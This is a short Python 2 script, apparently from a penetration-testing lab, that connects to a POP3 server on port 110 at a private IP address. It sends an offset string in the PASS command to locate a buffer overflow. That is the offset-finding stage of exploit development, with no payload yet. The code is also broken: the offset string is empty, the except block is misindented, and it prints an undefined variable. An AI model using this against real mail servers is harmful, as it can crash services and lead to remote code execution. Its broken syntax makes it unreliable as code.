#!/usr/bin/python
import socket, sys
from time import sleep

#Unique string of size N below
offset=
""

#UN=raw_input("Enter A username: ")	
#target=raw_input("Enter Target IP: ")	
#Tport=raw_input("Enter Target Port: ")	
UN='username'
target='10.11.20.153'
Tport=110

try:	
	print "Sending Offset of size %s"% str(len(offset))
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect=s.connect((target,Tport))
	s.recv(1024)
	#command to send with param we are trying to overflow
	s.send('USER '+UN+'\r\n')
	s.recv(1024)
	s.send('PASS '+offset+'\r\n')
	s.send('QUIT')	
	s.close()
	sleep(1)
		
	except:
		print "Crashed at %s Bytes" % str(len(buffer))
		sys.exit()
